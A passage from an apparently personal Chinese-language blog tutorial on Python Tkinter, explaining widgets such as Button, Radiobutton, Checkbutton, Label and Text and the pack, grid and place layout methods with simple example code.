title="GUI组件表："></a>GUI组件表：</h3><p>Tkinter的提供各种控件，如按钮，标签和文本框，一个GUI应用程序中使用。这些控件通常被称为控件或者部件。目前有15种Tkinter的部件。</p><table><thead><tr><th>Button</th><th>按钮控件；在程序中显示按钮。</th></tr></thead><tbody><tr><td>Canvas</td><td>画布控件；显示图形元素如线条或文本</td></tr><tr><td>Checkbutton</td><td>多选框控件；用于在程序中提供多项选择框</td></tr><tr><td>Entry</td><td>输入控件；用于显示简单的文本内容</td></tr><tr><td>Frame</td><td>框架控件；在屏幕上显示一个矩形区域，多用来作为容器</td></tr><tr><td>Label</td><td>标签控件；可以显示文本和位图</td></tr><tr><td>Listbox</td><td>列表框控件；在Listbox窗口小部件是用来显示一个字符串列表给用户</td></tr><tr><td>Menubutton</td><td>菜单按钮控件，用于显示菜单项。</td></tr><tr><td>Menu</td><td>菜单控件；显示菜单栏,下拉菜单和弹出菜单</td></tr><tr><td>Message</td><td>消息控件；用来显示多行文本，与label比较类似</td></tr><tr><td>Radiobutton</td><td>单选按钮控件；显示一个单选的按钮状态</td></tr><tr><td>Scale</td><td>范围控件；显示一个数值刻度，为输出限定范围的数字区间</td></tr><tr><td>Scrollbar</td><td>滚动条控件，当内容超过可视化区域时使用，如列表框。.</td></tr><tr><td>Text</td><td>文本控件；用于显示多行文本</td></tr><tr><td>Toplevel</td><td>容器控件；用来提供一个单独的对话框，和Frame比较类似</td></tr><tr><td>Spinbox</td><td>输入控件；与Entry类似，但是可以指定输入范围值</td></tr><tr><td>PanedWindow</td><td>PanedWindow是一个窗口布局管理的插件，可以包含一个或者多个子控件。</td></tr><tr><td>LabelFrame</td><td>labelframe 是一个简单的容器控件。常用与复杂的窗口布局。</td></tr><tr><td>messagebox</td><td>用于显示你应用程序的消息框。</td></tr></tbody></table><h4 id="Python-Tkinter-通用控件属性："><a href="#Python-Tkinter-通用控件属性：" class="headerlink" title="Python Tkinter 通用控件属性："></a>Python Tkinter 通用控件属性：</h4><img src="C:\Users\888888\AppData\Roaming\Typora\typora-user-images\1657019136331.png"  /><h4 id="Python-Tkinter-按钮组件-Button"><a href="#Python-Tkinter-按钮组件-Button" class="headerlink" title="Python Tkinter 按钮组件 (Button)"></a>Python Tkinter 按钮组件 (Button)</h4><p>按钮组件用于在 Python 应用程序中添加按钮，按钮上可以放上文本或图像，按钮可用于监听用户行为，能够与一个 Python 函数关联，当按钮被按下时，自动调用该函数。 </p><pre class="line-numbers language-python" data-language="python"><code class="language-python">w <span class="token operator">=</span> Button <span class="token punctuation">(</span> master<span class="token punctuation">,</span> option<span class="token operator">=</span>value<span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token punctuation">)</span><span class="token comment"># master 组件的父容器</span><span class="token comment"># option 可选项，这个包括很多内容这些选项可以用键 = 值的形式设置，并以逗号分隔</span><span class="token comment"># 包括command（按钮的关联函数），font（文本字体），height（按钮的高度），image（按钮的背景图片），width，text（文本），underline（下划线）等内容</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p> Button按钮的状态有：<code>normal</code>  ,  <code>active</code>  ,  <code>disabled</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> tkinter<span class="token keyword">import</span> tkinter<span class="token punctuation">.</span>messagebox top <span class="token operator">=</span> tkinter<span class="token punctuation">.</span>Tk<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">helloCallBack</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    tkinter<span class="token punctuation">.</span>messagebox<span class="token punctuation">.</span>showinfo<span class="token punctuation">(</span><span class="token string">"Hello Python"</span><span class="token punctuation">,</span> <span class="token string">"Hello Runoob"</span><span class="token punctuation">)</span>B <span class="token operator">=</span> tkinter<span class="token punctuation">.</span>Button<span class="token punctuation">(</span>top<span class="token punctuation">,</span> text<span class="token operator">=</span><span class="token string">"点我"</span><span class="token punctuation">,</span> command<span class="token operator">=</span>helloCallBack<span class="token punctuation">)</span>B<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token punctuation">)</span>top<span class="token punctuation">.</span>mainloop<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里稍微做一点说明，这个实例来自于菜鸟教程，而在菜鸟教程上的写法是 import tkMessageBox ,还是有很多区别的，在python3以后的版本中，tkinter应该首字母小写，而tkMessageBox及库中对应的函数应该相应改为<strong>tkinter.messagebox</strong></p><p>在具体使用按钮组件进行函数调用时也有对应内容：</p><ul><li><p>直接调用函数。<strong>参数表达式为“command=函数名”，注意函数名后面不要加括号，也不能传递参数</strong>。如下面的command=run1：</p></li><li><p>利用匿名函数调用函数和传递参数。参数的表达式为“command=lambda”:函数名（参数列表）</p></li></ul><h5 id="Python-Tkinter-单选按钮控件-Radiobutton"><a href="#Python-Tkinter-单选按钮控件-Radiobutton" class="headerlink" title="Python Tkinter 单选按钮控件(Radiobutton)"></a>Python Tkinter 单选按钮控件(Radiobutton)</h5><p>是为了响应故乡排斥的若干单选项的单击事件以触发运行自定义函数所设的，该控件排除具有共有属性外，还具有显示文本（text）、返回变量（variable）、返回值（value）、响应函数名（command）等重要属性。响应函数名“command=函数名”的用法与Button相同，函数名最后也要加括号。返回变量variable=var通常应预先声明变量的类型var=IntVar()或var=StringVar(),在所调用的函数中方可用var.get()方法获取被选中实例的value值。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> tkinter <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">def</span> <span class="token function">Mysel</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      dic <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token string">'甲'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string">'乙'</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token string">'丙'</span><span class="token punctuation">&#125;</span>      s <span class="token operator">=</span> <span class="token string">"您选了"</span> <span class="token operator">+</span> dic<span class="token punctuation">.</span>get<span class="token punctuation">(</span>var<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"项"</span>      lb<span class="token punctuation">.</span>config<span class="token punctuation">(</span>text <span class="token operator">=</span> s<span class="token punctuation">)</span>root <span class="token operator">=</span> Tk<span class="token punctuation">(</span><span class="token punctuation">)</span>root<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token string">'单选按钮'</span><span class="token punctuation">)</span>lb <span class="token operator">=</span> Label<span class="token punctuation">(</span>root<span class="token punctuation">)</span>lb<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token punctuation">)</span>var <span class="token operator">=</span> IntVar<span class="token punctuation">(</span><span class="token punctuation">)</span>rd1 <span class="token operator">=</span> Radiobutton<span class="token punctuation">(</span>root<span class="token punctuation">,</span>text<span class="token operator">=</span><span class="token string">"甲"</span><span class="token punctuation">,</span>variable<span class="token operator">=</span>var<span class="token punctuation">,</span>value<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>command<span class="token operator">=</span>Mysel<span class="token punctuation">)</span>rd1<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token punctuation">)</span>rd2 <span class="token operator">=</span> Radiobutton<span class="token punctuation">(</span>root<span class="token punctuation">,</span>text<span class="token operator">=</span><span class="token string">"乙"</span><span class="token punctuation">,</span>variable<span class="token operator">=</span>var<span class="token punctuation">,</span>value<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>command<span class="token operator">=</span>Mysel<span class="token punctuation">)</span>rd2<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token punctuation">)</span>rd3 <span class="token operator">=</span> Radiobutton<span class="token punctuation">(</span>root<span class="token punctuation">,</span>text<span class="token operator">=</span><span class="token string">"丙"</span><span class="token punctuation">,</span>variable<span class="token operator">=</span>var<span class="token punctuation">,</span>value<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span>command<span class="token operator">=</span>Mysel<span class="token punctuation">)</span>rd3<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token punctuation">)</span>root<span class="token punctuation">.</span>mainloop<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="Python-Tkinter-复选框（Checkbutton）"><a href="#Python-Tkinter-复选框（Checkbutton）" class="headerlink" title="Python Tkinter 复选框（Checkbutton）"></a>Python Tkinter 复选框（Checkbutton）</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 定义方法</span>w <span class="token operator">=</span> tkinter<span class="token punctuation">.</span>Checkbutton<span class="token punctuation">(</span> master<span class="token punctuation">,</span> option<span class="token operator">=</span>value<span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token punctuation">)</span><span class="token comment"># 在python3中，复选框的定义方式发生了略微改变</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>复选框</strong>：(Checkbutton) 是为了返回多个选项值的交互控件，通常不直接触发函数的执行。该控件除具有共有属性外，还具有显示文本（text）、返回变量（variable）、选中返回值（onvalue）和未选中默认返回值（offvalue）等重要属性。返回变量variable=var 通常可以预先逐项分别声明变量的类型var=IntVar() (默认)或 var=StringVar(), 在所调用的函数中方可分别调用 var.get()方法 取得被选中实例的 onvalue或offvalue值。复选框实例通常还可分别利用 select()、deselect()和 toggle() 方法对其进行选中、清除选中和反选操作。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#简单样例：</span><span class="token keyword">import</span> tkinter<span class="token punctuation">.</span>messagebox<span class="token keyword">import</span> tkintertop <span class="token operator">=</span> tkinter<span class="token punctuation">.</span>Tk<span class="token punctuation">(</span><span class="token punctuation">)</span>CheckVar1 <span class="token operator">=</span> tkinter<span class="token punctuation">.</span>IntVar<span class="token punctuation">(</span><span class="token punctuation">)</span>CheckVar2 <span class="token operator">=</span> tkinter<span class="token punctuation">.</span>IntVar<span class="token punctuation">(</span><span class="token punctuation">)</span>C1 <span class="token operator">=</span> tkinter<span class="token punctuation">.</span>Checkbutton<span class="token punctuation">(</span>top<span class="token punctuation">,</span> text<span class="token operator">=</span><span class="token string">"RUNOOB"</span><span class="token punctuation">,</span> variable<span class="token operator">=</span>CheckVar1<span class="token punctuation">,</span>onvalue<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> offvalue<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> height<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">,</span>width<span class="token operator">=</span><span class="token number">20</span><span class="token punctuation">)</span>C2 <span class="token operator">=</span> tkinter<span class="token punctuation">.</span>Checkbutton<span class="token punctuation">(</span>top<span class="token punctuation">,</span> text<span class="token operator">=</span><span class="token string">"GOOGLE"</span><span class="token punctuation">,</span> variable<span class="token operator">=</span>CheckVar2<span class="token punctuation">,</span>onvalue<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> offvalue<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> height<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">,</span> width<span class="token operator">=</span><span class="token number">20</span><span class="token punctuation">)</span>C1<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token punctuation">)</span>C2<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token punctuation">)</span>top<span class="token punctuation">.</span>mainloop<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="Python-Tkinter-标签控件（Label）及消息控件（Message）"><a href="#Python-Tkinter-标签控件（Label）及消息控件（Message）" class="headerlink" title="Python Tkinter 标签控件（Label）及消息控件（Message）"></a>Python Tkinter 标签控件（Label）及消息控件（Message）</h4><p>Python Tkinter 标签控件（Label）指定的窗口中显示的文本和图像。如果需要使用一行或多行且不应该被用户更改的标签控件需要用label控件。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">w <span class="token operator">=</span> Label <span class="token punctuation">(</span> master<span class="token punctuation">,</span> option<span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token punctuation">)</span><span class="token comment"># option 可选项内容与Button的可选项内容相近，但也有wraplength（标签文本显示行数）</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#一个简单样例：</span><span class="token keyword">import</span> tkinter <span class="token keyword">as</span> tkroot <span class="token operator">=</span> tk<span class="token punctuation">.</span>Tk<span class="token punctuation">(</span><span class="token punctuation">)</span>w <span class="token operator">=</span> tk<span class="token punctuation">.</span>Label<span class="token punctuation">(</span>root<span class="token punctuation">,</span> text<span class="token operator">=</span><span class="token string">"Hello RUNOOB!"</span><span class="token punctuation">)</span>w<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token punctuation">)</span>root<span class="token punctuation">.</span>mainloop<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>标签（Label）</strong>和 <strong>消息（Message）</strong>：除了单行与多行的不同外，属性和用法基本一致，用于呈现文本信息。</p><p>值得注意的是：属性text通常用于实例在第一次呈现时的固定文本，而如果需要在程序执行后发生变化，则可以使用下列方法之一实现：</p><p>1、用控件实例的configure()方法来改变属性text的值，可使显示的文本发生变化；</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> tkinter<span class="token keyword">import</span> time<span class="token keyword">def</span> <span class="token function">gettime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      timestr <span class="token operator">=</span> time<span class="token punctuation">.</span>strftime<span class="token punctuation">(</span><span class="token string">"%H:%M:%S"</span><span class="token punctuation">)</span> <span class="token comment"># 获取当前的时间并转化为字符串</span>      lb<span class="token punctuation">.</span>configure<span class="token punctuation">(</span>text<span class="token operator">=</span>timestr<span class="token punctuation">)</span>   <span class="token comment"># 重新设置标签文本</span>      root<span class="token punctuation">.</span>after<span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">,</span>gettime<span class="token punctuation">)</span> <span class="token comment"># 每隔1s调用函数 gettime 自身获取时间</span>root <span class="token operator">=</span> tkinter<span class="token punctuation">.</span>Tk<span class="token punctuation">(</span><span class="token punctuation">)</span>root<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token string">'时钟'</span><span class="token punctuation">)</span>lb <span class="token operator">=</span> tkinter<span class="token punctuation">.</span>Label<span class="token punctuation">(</span>root<span class="token punctuation">,</span>text<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">,</span>fg<span class="token operator">=</span><span class="token string">'blue'</span><span class="token punctuation">,</span>font<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">"黑体"</span><span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">)</span><span class="token punctuation">)</span>lb<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token punctuation">)</span>gettime<span class="token punctuation">(</span><span class="token punctuation">)</span>root<span class="token punctuation">.</span>mainloop<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2、先定义一个tkinter的内部类型变量var=StringVar() 的值也可以使显示文本发生变化。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> tkinter<span class="token keyword">import</span> time<span class="token keyword">def</span> <span class="token function">gettime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      var<span class="token punctuation">.</span><span class="token builtin">set</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>strftime<span class="token punctuation">(</span><span class="token string">"%H:%M:%S"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token comment"># 获取当前时间</span>      root<span class="token punctuation">.</span>after<span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">,</span>gettime<span class="token punctuation">)</span>   <span class="token comment"># 每隔1s调用函数 gettime 自身获取时间</span>root <span class="token operator">=</span> tkinter<span class="token punctuation">.</span>Tk<span class="token punctuation">(</span><span class="token punctuation">)</span>root<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token string">'时钟'</span><span class="token punctuation">)</span>var<span class="token operator">=</span>tkinter<span class="token punctuation">.</span>StringVar<span class="token punctuation">(</span><span class="token punctuation">)</span>lb <span class="token operator">=</span> tkinter<span class="token punctuation">.</span>Label<span class="token punctuation">(</span>root<span class="token punctuation">,</span>textvariable<span class="token operator">=</span>var<span class="token punctuation">,</span>fg<span class="token operator">=</span><span class="token string">'blue'</span><span class="token punctuation">,</span>font<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">"黑体"</span><span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">)</span><span class="token punctuation">)</span>lb<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token punctuation">)</span>gettime<span class="token punctuation">(</span><span class="token punctuation">)</span>root<span class="token punctuation">.</span>mainloop<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="Python-Tkinter-文本组件-Text"><a href="#Python-Tkinter-文本组件-Text" class="headerlink" title="Python Tkinter 文本组件 (Text)"></a>Python Tkinter 文本组件 (Text)</h4><img src="C:\Users\888888\AppData\Roaming\Typora\typora-user-images\1657025434153.png"  /><p> 上表位置的取值可为整数，浮点数或END（末尾），例如0.0表示第0列第0行</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> tkinter <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> time<span class="token keyword">import</span> datetime<span class="token keyword">def</span> <span class="token function">gettime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>       s<span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">(</span>datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">.</span>now<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'\n'</span>       txt<span class="token punctuation">.</span>insert<span class="token punctuation">(</span>END<span class="token punctuation">,</span>s<span class="token punctuation">)</span>       root<span class="token punctuation">.</span>after<span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">,</span>gettime<span class="token punctuation">)</span>  <span class="token comment"># 每隔1s调用函数 gettime 自身获取时间</span>root<span class="token operator">=</span>Tk<span class="token punctuation">(</span><span class="token punctuation">)</span>root<span class="token punctuation">.</span>geometry<span class="token punctuation">(</span><span class="token string">'320x240'</span><span class="token punctuation">)</span>txt<span class="token operator">=</span>Text<span class="token punctuation">(</span>root<span class="token punctuation">)</span>txt<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token punctuation">)</span>gettime<span class="token punctuation">(</span><span class="token punctuation">)</span>root<span class="token punctuation">.</span>mainloop<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><strong>输入框（Entry）</strong>：通常作为功能比较单一的接收单行文本输入的控件，虽然也有许多对其中文本进行操作的方法，但通常用的只有取值方法get()和用于删除文本的delete(起始位置，终止位置)，例如：清空输入框为delete(0，END)。</li></ul><h3 id="GUI应用程序类的通常写法"><a href="#GUI应用程序类的通常写法" class="headerlink" title="GUI应用程序类的通常写法"></a>GUI应用程序类的通常写法</h3><p>通过类application组织整个GUI程序，类application及继承了frame，及通过继承拥有了父类的特性。通过构造函数<code>_init_</code>()初始化窗口中的对象，通过createwidgets()方法创建窗口中的对象。</p><p>Frama框架是一个tkinter组件，表示一个矩形的区域。frame一般作为容器使用，可以放置其他组件，从而实现复杂的布局。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> tkinter <span class="token keyword">as</span> tk<span class="token keyword">class</span> <span class="token class-name">Application</span><span class="token punctuation">(</span>tk<span class="token punctuation">.</span>Frame<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> master<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token builtin">super</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>master<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>master <span class="token operator">=</span> master        self<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>create_widgets<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">create_widgets</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>hi_there <span class="token operator">=</span> tk<span class="token punctuation">.</span>Button<span class="token punctuation">(</span>self<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>hi_there<span class="token punctuation">[</span><span class="token string">"text"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"Hello World\n(click me)"</span>        self<span class="token punctuation">.</span>hi_there<span class="token punctuation">[</span><span class="token string">"command"</span><span class="token punctuation">]</span> <span class="token operator">=</span> self<span class="token punctuation">.</span>say_hi        self<span class="token punctuation">.</span>hi_there<span class="token punctuation">.</span>pack<span class="token punctuation">(</span>side<span class="token operator">=</span><span class="token string">"top"</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>quit <span class="token operator">=</span> tk<span class="token punctuation">.</span>Button<span class="token punctuation">(</span>self<span class="token punctuation">,</span> text<span class="token operator">=</span><span class="token string">"QUIT"</span><span class="token punctuation">,</span> fg<span class="token operator">=</span><span class="token string">"red"</span><span class="token punctuation">,</span>                              command<span class="token operator">=</span>self<span class="token punctuation">.</span>master<span class="token punctuation">.</span>destroy<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>quit<span class="token punctuation">.</span>pack<span class="token punctuation">(</span>side<span class="token operator">=</span><span class="token string">"bottom"</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">say_hi</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"hi there, everyone!"</span><span class="token punctuation">)</span>root <span class="token operator">=</span> tk<span class="token punctuation">.</span>Tk<span class="token punctuation">(</span><span class="token punctuation">)</span>app <span class="token operator">=</span> Application<span class="token punctuation">(</span>master<span class="token operator">=</span>root<span class="token punctuation">)</span>app<span class="token punctuation">.</span>mainloop<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="几何管理（控件布局）"><a href="#几何管理（控件布局）" class="headerlink" title="几何管理（控件布局）"></a>几何管理（控件布局）</h3><p>Tkinter控件有特定的几何状态管理方法，管理整个控件区域组织，以下是Tkinter公开的几何管理类：包、网格、位置</p><table><thead><tr><th>几何方法</th><th>描述</th></tr></thead><tbody><tr><td>pack()</td><td>包装；</td></tr><tr><td>grid()</td><td>网格；</td></tr><tr><td>place()</td><td>位置；</td></tr></tbody></table><h4 id="Pack-布局方式："><a href="#Pack-布局方式：" class="headerlink" title="Pack()布局方式："></a>Pack()布局方式：</h4><p>Pack()方法： 是一种简单的布局方法，如果不加参数的默认方式，将按布局语句的先后，以最小占用空间的方式自上而下地排列控件实例，并且保持控件本身的最小尺寸。</p><p>使用pack()方法可设置 fill、side 等属性参数。</p><table><thead><tr><th>pack()函数的属性</th><th>取值的对应意义</th></tr></thead><tbody><tr><td>fill=X/y/BOTH</td><td>允许控件向水平方向、垂直方向或二维伸展填充未被占用控件</td></tr><tr><td>side=left/right/bottom</td><td>表示本控件实例的布局相对于下一个控件实例的方位</td></tr></tbody></table><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> tkinter <span class="token keyword">import</span>  <span class="token operator">*</span>root <span class="token operator">=</span> Tk<span class="token punctuation">(</span><span class="token punctuation">)</span>lbred <span class="token operator">=</span> Label<span class="token punctuation">(</span>root<span class="token punctuation">,</span>text<span class="token operator">=</span><span class="token string">"Red"</span><span class="token punctuation">,</span>fg<span class="token operator">=</span><span class="token string">"Red"</span><span class="token punctuation">,</span>relief<span class="token operator">=</span>GROOVE<span class="token punctuation">)</span>lbred<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token punctuation">)</span>lbgreen <span class="token operator">=</span> Label<span class="token punctuation">(</span>root<span class="token punctuation">,</span>text<span class="token operator">=</span><span class="token string">"绿色"</span><span class="token punctuation">,</span>fg<span class="token operator">=</span><span class="token string">"green"</span><span class="token punctuation">,</span>relief<span class="token operator">=</span>GROOVE<span class="token punctuation">)</span>lbgreen<span class="token punctuation">.</span>pack<span class="token punctuation">(</span>side<span class="token operator">=</span>RIGHT<span class="token punctuation">)</span>lbblue <span class="token operator">=</span> Label<span class="token punctuation">(</span>root<span class="token punctuation">,</span>text<span class="token operator">=</span><span class="token string">"蓝"</span><span class="token punctuation">,</span>fg<span class="token operator">=</span><span class="token string">"blue"</span><span class="token punctuation">,</span>relief<span class="token operator">=</span>GROOVE<span class="token punctuation">)</span>lbblue<span class="token punctuation">.</span>pack<span class="token punctuation">(</span>fill<span class="token operator">=</span>X<span class="token punctuation">)</span>root<span class="token punctuation">.</span>mainloop<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="grid-布局方式："><a href="#grid-布局方式：" class="headerlink" title="grid()布局方式："></a>grid()布局方式：</h4><p><strong>grid()方法</strong>：是基于网格的布局。先虚拟一个二维表格，再在该表格中布局控件实例。由于在虚拟表格的单元中所布局的控件实例大小不一，单元格也没有固定或均一的大小，因此其仅用于布局的定位。pack()方法与grid()方法不能混合使用。<br> <strong>grid()方法常用布局参数如下：</strong></p><ul><li> <strong>column:</strong> 控件实例的起始列，最左边为第0列。</li><li> <strong>columnspan:</strong> 控件实例所跨越的列数，默认为1列。</li><li> <strong>ipadx,ipady:</strong> 控件实例所呈现区域内部的像素数，用来设置控件实例的大小。</li><li> <strong>padx,pady:</strong> 控件实例所占据空间像素数，用来设置实例所在单元格的大小。</li><li> <strong>row:</strong> 控件实例的起始行，最上面为第0行。</li><li> <strong>rowspan:</strong> 控件实例的起始行数，默认为1行。</li></ul><h4 id="place-布局方法："><a href="#place-布局方法：" class="headerlink" title="place()布局方法："></a>place()布局方法：</h4><p><strong>place()方法</strong>：根据控件实例在父容器中的绝对或相对位置参数进行布局。其常用布局参数如下：</p><ul><li><strong>x,y：</strong>控件实例在根窗体中水平和垂直方向上的其实位置（单位为像素）。注意，根窗体左上角为0,0,水平向右，垂直向下为正方向。</li><li><strong>relx,rely：</strong>控件实例在根窗体中水平和垂直方向上起始布局的相对位置。即相对于根窗体宽和高的比例位置，取值在<code>0.0~1.0</code>之间。</li><li><strong>height,width：</strong>控件实例本身的高度和宽度（单位为像素）。</li><li><strong>relheight,relwidth：</strong>控件实例相对于根窗体的高度和宽度比例，取值在<code>0.0~1.0</code>之间。</li><li>利用place()方法配合relx,rely和relheight,relwidth参数所得的到的界面可自适应根窗体尺寸的大小。place()方法与grid()方法可以混合使用。如下例子：利用place()方法排列消息（多行标签）。</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#参考样例：</span><span class="token keyword">from</span> tkinter <span class="token keyword">import</span> <span class="token operator">*</span>root <span class="token operator">=</span> Tk<span class="token punctuation">(</span><span class="token punctuation">)</span>root<span class="token punctuation">.</span>geometry<span class="token punctuation">(</span><span class="token string">'320x240'</span><span class="token punctuation">)</span>msg1 <span class="token operator">=</span> Message<span class="token punctuation">(</span>root<span class="token punctuation">,</span>text<span class="token operator">=</span><span class="token triple-quoted-string string">'''我的水平起始位置相对窗体 0.2，垂直起始位置为绝对位置 80 像素，我的高度是窗体高度的0.4，宽度是200像素'''</span><span class="token punctuation">,</span>relief<span class="token operator">=</span>GROOVE<span class="token punctuation">)</span>msg1<span class="token punctuation">.</span>place<span class="token punctuation">(</span>relx<span class="token operator">=</span><span class="token number">0.2</span><span class="token punctuation">,</span>y<span class="token operator">=</span><span class="token number">80</span><span class="token punctuation">,</span>relheight<span class="token operator">=</span><span class="token number">0.4</span><span class="token punctuation">,</span>width<span class="token operator">=</span><span class="token number">200</span><span class="token punctuation">)</span>root<span class="token punctuation">.</span>mainloop<span class="token 